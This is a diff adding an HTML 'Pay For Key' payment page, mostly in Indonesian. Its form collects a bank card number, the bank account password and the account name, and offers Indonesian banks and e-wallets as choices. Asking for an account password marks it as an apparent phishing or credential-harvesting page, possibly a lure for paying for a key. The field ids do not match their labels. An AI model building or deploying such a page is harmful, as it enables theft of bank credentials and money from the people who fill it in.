@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Pembayaran</title>
+    <style>
+        /* Gaya tampilan halaman */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            padding: 20px;
+        }
+        .payment-form {
+            max-width: 400px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            font-weight: bold;
+        }
+        input[type="text"],
+        input[type="number"],
+        select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+        button {
+            background-color: #007bff;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-form">
+        <h2>Pay For Key</h2>
+        <form action="/process-payment" method="post">
+            <div class="form-group">
+                <label for="card-number">Nomor Kartu bank:</label>
+                <input type="number" id="card-number" name="card-number" placeholder="Masukkan nomor" required>
+            </div>
+            <div class="form-group">
+                <label for="expiry-date">password account:</label>
+                <input type="password" id="expiry-date" name="your password" placeholder="password" required>
+            </div>
+            <div class="form-group">
+                <label for="cvc">account name:</label>
+                <input type="text" id="user" name="name" placeholder="Masukkan nama user" required>
+            </div>
+            <div class="form-group">
+                <label for="bank">Pilih Bank:</label>
+                <select id="bank" name="bank">
+                  <option value="None">None</option>
+                    <option value="BCA">BCA</option>
+                    <option value="BRI">BRI</option>
+                    <option value="BNI">BNI</option>
+                    <option value="Mandiri">Mandiri</option>
+                    <!-- Tambahkan opsi bank lainnya di sini -->
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="E-Wallet">Pilih E-WALLET:</label>
+                <select id="E-Wallet" name="Wallet">
+                  <option value="None">None</option>
+                    <option value="DANA">DANA</option>
+                    <option value="GOPAY">GOPAY</option>
+                    <option value="LINKAJA">LINKAJA</option>
+                    <option value="QR">QR {proses} {comming soon}</option>
+                    <!-- Tambahkan opsi bank lainnya di sini -->
+                </select>
+            </div>
+            <button type="submit">pay</button>
+        </form>
+    </div>
+</body>
+</html>
